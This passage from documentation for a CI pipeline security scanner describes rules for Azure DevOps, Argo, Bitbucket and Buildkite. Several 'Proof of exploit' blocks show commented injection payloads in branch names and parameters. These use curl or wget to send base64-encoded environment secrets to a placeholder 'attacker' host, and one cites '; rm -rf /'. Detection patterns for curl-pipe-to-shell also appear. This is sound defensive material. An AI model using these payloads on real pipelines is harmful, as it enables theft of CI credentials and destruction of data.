**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** `$(Build.SourceBranch*)`, `$(Build.SourceVersionMessage)`, and `$(System.PullRequest.*)` are populated from SCM event metadata the attacker controls. Inline interpolation into a script body executes crafted content.

**Recommendation.** Pass these values through an intermediate pipeline variable declared with `readonly: true`, and reference that variable through an environment variable rather than `$(...)` macro interpolation. ADO expands `$(…)` before shell quoting, so inline use is never safe.

**Proof of exploit.**

# Vulnerable: PR title macro interpolated straight into script.
trigger: none
pr:
  branches:
    include: [main]
jobs:
  - job: triage
    pool: { vmImage: ubuntu-latest }
    steps:
      - script: |
          echo "New PR: $(System.PullRequest.SourceBranch)"
          echo "Subject: $(Build.SourceVersionMessage)"

# Attack: open a PR from a branch whose name carries shell:
#
#   git checkout -b 'foo";curl https://attacker/exfil \
#     -d "$(printenv | base64)";echo "x'
#
# ADO expands ``$(...)`` BEFORE shell quoting, so the macro
# value's `"` closes the echo and the rest becomes shell.
# The PR-validated pipeline has the same service-connection
# credentials a main-branch build would have, so the curl
# exfils every secret in scope. Classic pwn-request shape.

# Safe: route through env so the value is never interpolated
# into the shell template.
      - bash: |
          echo "New PR: $PR_BRANCH"
          echo "Subject: $COMMIT_MSG"
        env:
          PR_BRANCH: $(System.PullRequest.SourceBranch)
          COMMIT_MSG: $(Build.SourceVersionMessage)

**Source:** [`ADO-002`](../providers/azure.md#ado-002) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ado-003 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data, [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** Scans `variables:` in both the mapping form (`{KEY: VAL}`) and the list form (`[{name: X, value: Y}]`) that ADO supports. AWS keys are detected by value shape regardless of variable name.

**Recommendation.** Store secrets in an Azure Key Vault or a Library variable group with the secret flag set; reference them via `$(SECRET_NAME)` at runtime. For cloud access prefer Azure workload identity federation.

**Source:** [`ADO-003`](../providers/azure.md#ado-003) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-004`: Deployment job missing environment binding <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-004 }

**Evidences:** [`5.1.4`](#ctrl-5-1-4) Ensure deployment configuration manifests are reviewed before apply, [`5.2.1`](#ctrl-5-2-1) Ensure deployment environments are separated.

**How this is detected.** Without an `environment:` binding, ADO cannot enforce approvals, checks, or deployment history against a named resource. Every `deployment:` job should bind one.

**Recommendation.** Add `environment: <name>` to every `deployment:` job. Configure approvals, required branches, and business-hours checks on the matching Environment in the ADO UI.

**Known false positives.**

- The deploy-name regex (``deploy`` / ``release`` / ``publish`` / ``promote``) flags jobs whose names include those tokens for non-deploy reasons (e.g. ``release-notes-build`` that only generates a changelog). The deploy-command regex similarly fires on test pipelines that exercise ``kubectl apply --dry-run`` or ``helm template`` for validation. Suppress those jobs per-resource via ``--ignore-file`` once you've verified they don't actually mutate any environment.

**Source:** [`ADO-004`](../providers/azure.md#ado-004) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-005`: Container image not pinned to specific version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ado-005 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Container images can be declared at `resources.containers[].image` or `job.container` (string or `{image:}`). Floating / untagged refs let the publisher swap the image contents.

**Recommendation.** Reference images by `@sha256:<digest>` or at minimum a full immutable version tag. Avoid `:latest` and untagged refs.

**Source:** [`ADO-005`](../providers/azure.md#ado-005) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-006 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Passes when cosign / sigstore / slsa-* / notation-sign appears anywhere in the pipeline text.

**Recommendation.** Add a task that runs `cosign sign` or `notation sign`, Azure Pipelines' workload identity federation enables keyless signing. Publish the signature to the artifact feed and verify it at deploy time.

**Source:** [`ADO-006`](../providers/azure.md#ado-006) in the [Azure DevOps provider](../providers/azure.md).

#### `ADO-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ado-007 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact.

**Recommendation.** Add an SBOM step, `microsoft/sbom-tool`, `syft . -o cyclonedx-json`, or `anchore/sbom-action`. Publish the SBOM as a pipeline artifact so downstream consumers can ingest it.

**Source:** [`ADO-007`](../providers/azure.md#ado-007) in the [Azure DevOps provider](../providers/azure.md).

#### `ARGO-001`: Argo template container image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Walks ``spec.templates[].container``, ``spec.templates[].script``, and ``spec.templates[].containerSet.containers[]``. The image must contain ``@sha256:`` followed by a 64-char hex digest.

**Recommendation.** Pin every container / script template image to a content-addressable digest (``alpine@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the workflow's containers at the next pull, with no audit trail in the WorkflowTemplate.

**Source:** [`ARGO-001`](../providers/argo.md#argo-001) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-002`: Argo template container runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-argo-002 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Detection fires on ``securityContext.privileged: true``, ``runAsUser: 0``, ``runAsNonRoot: false``, ``allowPrivilegeEscalation: true``, or no ``securityContext`` block at all. Also walks ``spec.podSpecPatch`` (raw YAML) for an explicit ``privileged: true`` token.

**Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every template container / script. A privileged container shares the node's kernel namespaces; a malicious image then has root on the build node and breaks the boundary between workflow and cluster.

**Source:** [`ARGO-002`](../providers/argo.md#argo-002) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-003`: Argo workflow uses the default ServiceAccount <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-003 }

**Evidences:** [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** Applies to ``Workflow`` and ``CronWorkflow``. ``WorkflowTemplate`` / ``ClusterWorkflowTemplate`` are exempt because the SA is set on the run that references them. An explicit ``serviceAccountName: default`` is treated the same as omission.

**Recommendation.** Set ``spec.serviceAccountName`` (or ``spec.workflowSpec.serviceAccountName`` for CronWorkflow) to a least-privilege ServiceAccount that carries only the secrets and RBAC the workflow needs. Falling back to the namespace's ``default`` SA grants access to whatever cluster-admin or wildcard role someone later binds to ``default``, a privilege-escalation surface that should never be load-bearing for workflow pods.

**Source:** [`ARGO-003`](../providers/argo.md#argo-003) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-004`: Argo workflow mounts hostPath or shares host namespaces <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-argo-004 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Walks ``spec.volumes[].hostPath`` and the raw ``spec.podSpecPatch`` string for ``hostNetwork``, ``hostPID``, ``hostIPC``, and ``hostPath``.

**Recommendation.** Use ``emptyDir`` or PVC-backed volumes instead of ``hostPath``. Drop ``hostNetwork: true`` / ``hostPID: true`` / ``hostIPC: true`` from any inline ``podSpecPatch``. A hostPath mount of ``/var/run/docker.sock`` or ``/`` lets the workflow break out of the pod and act as the underlying node.

**Source:** [`ARGO-004`](../providers/argo.md#argo-004) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-005`: Argo input parameter interpolated unsafely in script / args <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-argo-005 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** Fires on any ``{{inputs.parameters.X}}``, ``{{workflow.parameters.X}}``, or ``{{item.X}}`` token inside a ``script.source`` body or a ``container.args`` string that isn't already wrapped in quotes. Doesn't fire on the env-var indirection pattern, which is safe.

**Recommendation.** Don't interpolate ``{{inputs.parameters.<name>}}`` directly into ``script.source`` or ``container.args``. Argo substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Pass the parameter via ``env:`` (``value: '{{inputs.parameters.<name>}}'``) and reference the env var quoted in the script (``"$NAME"``); or use ``inputs.artifacts`` for file payloads.

**Known false positives.**

- Parameters whose values are always controlled by trusted templates (a fixed enum, an internal SHA, an upstream service identifier the workflow generates itself) are safe to interpolate unquoted but the rule has no way to see the producer. Suppress per-template with ``--ignore-file`` once you've verified the parameter source can't reach a user. Quoted forms (``"{{inputs.parameters.X}}"``) are already excluded by the negative-lookbehind, so the typical safe pattern doesn't false-positive.

**Proof of exploit.**

# Vulnerable: webhook-triggered workflow interpolates a
# user-supplied parameter directly into a shell script.
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata: { generateName: greet- }
spec:
  entrypoint: main
  arguments:
    parameters:
      - name: who
  templates:
    - name: main
      inputs: { parameters: [ { name: who } ] }
      script:
        image: alpine:3.20
        command: [sh]
        source: |
          echo Hello {{inputs.parameters.who}}

# Attack: a webhook caller (or anyone with Submit on the
# WorkflowTemplate) supplies a parameter carrying shell:
#
#   argo submit greet.yml -p who='x;wget -qO- attacker/exfil \
#     -d "$(env|base64)";:'
#
# Argo substitutes the parameter BEFORE handing the source
# to ``sh``, so the `;` ends the echo and the next command
# runs. The pod inherits the workflow's ServiceAccount; if
# that SA has any cluster privilege (mount, image-pull, kubectl)
# the attacker now has it.

# Safe: route through env so the shell only sees a quoted
# expansion of a controlled-name variable.
      script:
        image: alpine:3.20
        command: [sh]
        env:
          - name: WHO
            value: '{{inputs.parameters.who}}'
        source: |
          echo "Hello $WHO"

**Source:** [`ARGO-005`](../providers/argo.md#argo-005) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-006`: Literal secret value in Argo template env or parameter default <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-argo-006 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data.

**How this is detected.** Strong matches: AWS access keys, GitHub PATs, JWTs. Weak match: env var name suggests a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) and the value is a non-empty literal rather than an interpolation.

**Recommendation.** Mount secrets via ``env.valueFrom.secretKeyRef`` (or a ``volumes:`` Secret mount) instead of writing the value into ``env.value`` or ``arguments.parameters[].value``. Workflow manifests are committed to git and cluster-readable; literal values leak through normal access paths.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ARGO-006`](../providers/argo.md#argo-006) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-007`: Argo workflow has no activeDeadlineSeconds <span class="pg-sev pg-sev--low">LOW</span> { #detail-argo-007 }

**Evidences:** [`2.2.2`](#ctrl-2-2-2) Ensure build workers are single-use.

**How this is detected.** Applies to ``Workflow``, ``CronWorkflow``, ``WorkflowTemplate``, and ``ClusterWorkflowTemplate``. The field can sit at the workflow level or on individual templates.

**Recommendation.** Set ``spec.activeDeadlineSeconds`` (or ``spec.workflowSpec.activeDeadlineSeconds`` on a ``CronWorkflow``) so a hung step can't pin the workflow controller's reconcile cycle indefinitely. Pick a value generous enough for the slowest legitimate run (e.g. 3600 for a typical pipeline, 21600 for ML training). Per-template ``activeDeadlineSeconds`` is also accepted as evidence of intent.

**Source:** [`ARGO-007`](../providers/argo.md#argo-007) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-008`: Argo script source pipes remote install or disables TLS <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-argo-008 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Walks ``script.source`` and joined ``container.args`` text with the cross-provider ``CURL_PIPE_RE`` and ``TLS_BYPASS_RE`` regexes.

**Recommendation.** Replace ``curl ... | sh`` with a download-then-verify-then-execute pattern. Drop TLS-bypass flags (``curl -k``, ``git config http.sslverify false``); install the missing CA into the template image instead. Both forms let an attacker controlling DNS / a transparent proxy substitute the script the workflow runs.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`ARGO-008`](../providers/argo.md#argo-008) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-009`: Artifacts not signed (no cosign/sigstore step) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-009 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Detection mirrors GHA-006 / TKN-009 / BK-009, the shared signing-token catalog (cosign, sigstore, slsa-github-generator, slsa-framework, notation-sign) is searched across every string in each Argo document. Fires only on artifact-producing Workflows / WorkflowTemplates (those that invoke ``docker build`` / ``docker push`` / kaniko / ``helm upgrade`` / ``aws s3 sync`` / etc.) so lint-only Workflows don't trip it.

**Recommendation.** Add a cosign step to the Workflow. The most common shape is a final ``sign`` template that runs ``cosign sign --yes <repo>@sha256:<digest>`` after the build. Sign by digest, not tag, so a re-pushed tag can't bypass the signature.

**Source:** [`ARGO-009`](../providers/argo.md#argo-009) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-010`: No SBOM generated for build artifacts <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-010 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** An SBOM (CycloneDX or SPDX) records every component baked into the build. Without one, post-incident triage can't answer ``did this CVE ship?`` for a given artifact. Detection uses the shared SBOM-token catalog: syft, cyclonedx, cdxgen, spdx-tools, microsoft/sbom-tool. Fires only on artifact-producing Workflows.

**Recommendation.** Add an SBOM-generation template. ``syft <artifact> -o cyclonedx-json > /tmp/sbom.json`` runs in any standard container; ``cyclonedx-cli`` and ``cdxgen`` are alternative producers. Persist the SBOM as an output artifact so downstream templates and consumers can read it.

**Source:** [`ARGO-010`](../providers/argo.md#argo-010) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-011`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-011 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked), [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Provenance generation is distinct from signing. A signed artifact proves *who* published it; a provenance attestation proves *where / how* it was built. Detection uses the shared provenance-token catalog (``slsa-framework``, ``cosign attest``, ``in-toto``, ``witness run``, ``attest-build-provenance``).

**Recommendation.** Add a ``cosign attest --predicate slsa.json --type slsaprovenance <ref>`` step after the build template, or use ``witness run`` to record the build environment. Publish the attestation alongside the artifact so consumers can verify *how* it was built, not just *who* signed it.

**Source:** [`ARGO-011`](../providers/argo.md#argo-011) in the [Argo Workflows provider](../providers/argo.md).

#### `ARGO-012`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-argo-012 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.3`](#ctrl-3-1-3) Ensure signed metadata of dependencies is verified.

**How this is detected.** Vulnerability scanning sits at a different layer from signing and SBOM. It answers *does this artifact ship a known CVE?* rather than *can we verify what it is?*. Detection uses the shared vuln-scan-token catalog: trivy, grype, snyk, npm-audit, pip-audit, osv-scanner, govulncheck, anchore, codeql-action, semgrep, bandit, checkov, tfsec. Walks every Argo document and passes if any document includes a scanner reference.

**Recommendation.** Add a vulnerability scanner template. ``trivy fs /workdir`` for source / filesystem; ``trivy image <ref>`` for container images. ``grype``, ``snyk``, ``npm audit``, ``pip-audit`` are alternatives. Fail the template on findings above a chosen severity so a regression blocks the merge instead of shipping.

**Source:** [`ARGO-012`](../providers/argo.md#argo-012) in the [Argo Workflows provider](../providers/argo.md).

#### `BB-001`: pipe: action not pinned to exact version <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Bitbucket pipes are docker-image references. Major-only (`:1`) or missing tags let Atlassian/the publisher swap the image contents. Full semver or sha256 digest is required.

**Recommendation.** Pin every `pipe:` to a full semver tag (e.g. `atlassian/aws-s3-deploy:1.4.0`) or to an immutable SHA. Floating majors like `:1` can roll to new code silently.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-001`](../providers/bitbucket.md#bb-001) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-002`: Script injection via attacker-controllable context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-002 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** $BITBUCKET_BRANCH, $BITBUCKET_TAG, and $BITBUCKET_PR_* are populated from SCM event metadata the attacker controls. Interpolating them unquoted into a shell command lets a crafted branch or tag name can execute inline.

**Recommendation.** Always double-quote interpolations of ref-derived variables (`"$BITBUCKET_BRANCH"`). Avoid passing them to `eval`, `sh -c`, or unquoted command arguments.

**Known false positives.**

- Pipelines that *parse* a ref name rather than execute it (``echo "$BITBUCKET_BRANCH" | cut -d/ -f2``) still interpolate the variable but expose no shell-execution surface for the value. The rule has no AST-level understanding of the surrounding shell context, so a well-quoted use that happens to live near an unrelated ``$(...)`` substitution can read as an offender. Suppress per-step via ``--ignore-file`` if the value is only consumed as data.

**Proof of exploit.**

# Vulnerable: branch name interpolated unquoted into shell.
image: alpine:latest
pipelines:
  pull-requests:
    '**':
      - step:
          name: triage
          script:
            - echo Building $BITBUCKET_BRANCH
            - ./scripts/build.sh $BITBUCKET_BRANCH

# Attack: open a PR from a branch whose name is shell:
#
#   git checkout -b 'foo;curl https://attacker/x \
#     -d "$(env|base64)";:'
#
# Bitbucket substitutes ``$BITBUCKET_BRANCH`` literally before
# the shell parses the line, so the `;` becomes a command
# separator and the curl exfils the step's env (which holds
# every repository / workspace variable in scope, including
# deploy keys configured for the pipeline).

# Safe: double-quote and pass via env so the value is only
# consumed as data.
      - step:
          name: triage
          script:
            - echo "Building $BRANCH"
            - ./scripts/build.sh "$BRANCH"
          # Bitbucket has no declarative env block; assign
          # via shell so the value is captured as a single
          # argv element from the controlled assignment.
          # (Equivalent: BRANCH="$BITBUCKET_BRANCH"; ...)

**Source:** [`BB-002`](../providers/bitbucket.md#bb-002) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-003`: Variables contain literal secret values <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-003 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data, [`2.4.3`](#ctrl-2-4-3) Ensure access to the pipeline execution environment is restricted.

**How this is detected.** Scans `definitions.variables` and each step's `variables:` for entries whose KEY looks credential-shaped and whose VALUE is a literal string. AWS access keys are detected by value shape regardless of key name.

**Recommendation.** Store credentials as Repository / Deployment Variables in Bitbucket's Pipelines settings with the 'Secured' flag, and reference them by name. Prefer short-lived OIDC tokens for cloud access.

**Source:** [`BB-003`](../providers/bitbucket.md#bb-003) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-004`: Deploy step missing `deployment:` environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-004 }

**Evidences:** [`5.1.4`](#ctrl-5-1-4) Ensure deployment configuration manifests are reviewed before apply, [`5.2.1`](#ctrl-5-2-1) Ensure deployment environments are separated.

**How this is detected.** A step whose name or invoked pipe matches `deploy` / `release` / `publish` / `promote` should declare a `deployment:` field so Bitbucket enforces deployment-scoped variables, approvals, and history.

**Recommendation.** Add `deployment: production` (or `staging` / `test`) to the step. Configure the matching environment in the repo's Deployments settings with required reviewers and secured variables.

**Source:** [`BB-004`](../providers/bitbucket.md#bb-004) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-005`: Step has no `max-time`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-005 }

**Evidences:** [`2.2.2`](#ctrl-2-2-2) Ensure build workers are single-use.

**How this is detected.** Without `max-time`, the step runs until Bitbucket's 120-minute global default kills it. Explicit per-step timeouts cap blast radius and cost.

**Recommendation.** Add `max-time: <minutes>` to each step, sized to the 95th percentile of historical runtime plus margin. Bounded runs limit the blast radius of a compromised build and prevent runaway minute consumption.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-005`](../providers/bitbucket.md#bb-005) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-006 }

**Evidences:** [`4.1.1`](#ctrl-4-1-1) Ensure all artifacts on all releases are verified (signed, integrity-checked).

**How this is detected.** Unsigned artifacts can't be verified downstream. Passes when cosign / sigstore / slsa-* / notation-sign appears in the pipeline body.

**Recommendation.** Add a step that runs `cosign sign` against the built image or archive, using Bitbucket OIDC for keyless signing where possible. Publish the signature next to the artifact and verify it at deploy time.

**Source:** [`BB-006`](../providers/bitbucket.md#bb-006) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BB-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-007 }

**Evidences:** [`4.4.1`](#ctrl-4-4-1) Ensure artifacts have provenance/SBOM metadata.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / sbom-tool / Trivy-SBOM appears.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM as a build artifact.

**Source:** [`BB-007`](../providers/bitbucket.md#bb-007) in the [Bitbucket provider](../providers/bitbucket.md).

#### `BK-001`: Buildkite plugin not pinned to an exact version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-001 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** Buildkite resolves plugin refs at agent boot. ``foo#v1.2.3`` locks the version; ``foo#main`` / ``foo`` does not. Detection fires on bare names, branch keywords, and partial-semver pins (``v4``, ``v4.13``).

**Recommendation.** Pin every plugin reference to an exact tag (``docker-compose#v4.13.0``) or a 40-char commit SHA. Bare references (``docker-compose``), branch refs (``#main`` / ``#master``), and major-only floats (``#v4``) resolve to whatever is current at agent start time, which lets a compromised plugin release execute inside the pipeline.

**Source:** [`BK-001`](../providers/buildkite.md#bk-001) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-002`: Literal secret value in pipeline env block <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-002 }

**Evidences:** [`2.3.4`](#ctrl-2-3-4) Ensure pipelines are scanned for secrets and sensitive data.

**How this is detected.** Detection fires on values that look like AWS access keys, GitHub PATs, OpenAI keys, JWTs, or generic high-entropy tokens, plus on env-var names that imply a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) when the value is a non-empty literal rather than an interpolation (``$SECRET_FROM_AGENT_HOOK``).

**Recommendation.** Move the value out of the pipeline file. Use Buildkite's agent secrets hooks (``secrets/`` directory or ``BUILDKITE_PLUGIN_AWS_SSM_*``), the ``aws-ssm`` / ``vault-secrets`` plugins, or the ``BUILDKITE_PIPELINE_DEFAULT_BRANCH`` env var pulled from a secret manager. The pipeline.yml is committed to the repo and visible to anyone with read access.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Names that imply a secret but actually store a non-sensitive identifier flag here: ``CACHE_KEY: build-2024-Q4``, ``API_KEY_PATH: /var/run/secrets/api``, ``SECRET_NAME: my-vault-secret``. The rule has no way to tell from the name + literal alone whether the value is the credential or merely a reference to one. Also: deliberate test fixtures and documentation snippets that embed canonical example values (``AKIAIOSFODNN7EXAMPLE``) match the strong-pattern set; this is intentional, real-world copies of those example literals usually mean a docs paste was never substituted.

**Source:** [`BK-002`](../providers/buildkite.md#bk-002) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-003`: Untrusted Buildkite variable interpolated in command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-003 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened, [`2.3.8`](#ctrl-2-3-8) Ensure pipeline configuration files are reviewed before execution.

**How this is detected.** Buildkite passes branch / tag / message metadata as environment variables. Putting them inside ``$(...)`` or shelling out with the value unquoted is a classic command-injection vector. The detection fires on the unquoted interpolation form and on use inside ``eval`` / ``$(...)``.

**Recommendation.** Don't interpolate ``$BUILDKITE_BRANCH``, ``$BUILDKITE_TAG``, ``$BUILDKITE_MESSAGE``, ``$BUILDKITE_PULL_REQUEST_*``, or ``$BUILDKITE_BUILD_AUTHOR*`` directly into shell commands. These come from the pull request / branch and are attacker-controllable. Quote them and assign to a local variable first (``branch="$BUILDKITE_BRANCH"; ./script --branch "$branch"``), or pass them as arguments to a script you own.

**Known false positives.**

- The single-token double-quoted form (``"$BUILDKITE_BRANCH"``) is already excluded; multi-token shell snippets that *look* unquoted but are consumed safely by the downstream tool (e.g. a ``./script.sh $BUILDKITE_BRANCH`` where the script treats argv as data and never re-evaluates) still flag. The rule has no AST-level understanding of the called script, suppress per-step via ``--ignore-file`` once you've verified the script handles untrusted argv safely (or quote the use, which is the better fix).

**Source:** [`BK-003`](../providers/buildkite.md#bk-003) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-004`: Remote script piped into shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-004 }

**Evidences:** [`1.4.1`](#ctrl-1-4-1) Ensure third-party artifacts and open-source libraries are verified, [`3.1.5`](#ctrl-3-1-5) Ensure only trusted package managers and repositories are used.

**How this is detected.** The detection fires on ``curl|bash``, ``curl|sh``, ``wget|bash``, ``iex (iwr ...)``, and the corresponding ``Invoke-WebRequest|Invoke-Expression`` PowerShell forms. Use ``curl -fsSLO <url>; sha256sum -c install.sh.sha256; bash install.sh`` instead.

**Recommendation.** Download the installer to disk, verify a checksum or signature, then execute it. ``curl ... | sh`` lets the remote host change what runs in your pipeline at any time, and any TLS / DNS error during download silently feeds a partial script to the shell.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-004`](../providers/buildkite.md#bk-004) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-005`: Container started with --privileged or host-bind escalation <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-005 }

**Evidences:** [`2.1.3`](#ctrl-2-1-3) Ensure the build environment is hardened.

**How this is detected.** Detection fires on ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host`` / ``--ipc=host`` / ``--userns=host``, and explicit mounts of the host Docker socket (``/var/run/docker.sock``).

**Recommendation.** Drop ``--privileged``, ``--cap-add=SYS_ADMIN``, ``--pid=host``, and ``-v /var/run/docker.sock`` from container invocations. If the workload needs Docker-in-Docker, use a build-specific rootless option (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead of opening the host kernel and the agent's Docker socket to the build script.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BK-005`](../providers/buildkite.md#bk-005) in the [Buildkite provider](../providers/buildkite.md).

#### `BK-006`: Step has no timeout_in_minutes <span class="pg-sev pg-sev--low">LOW</span> { #detail-bk-006 }

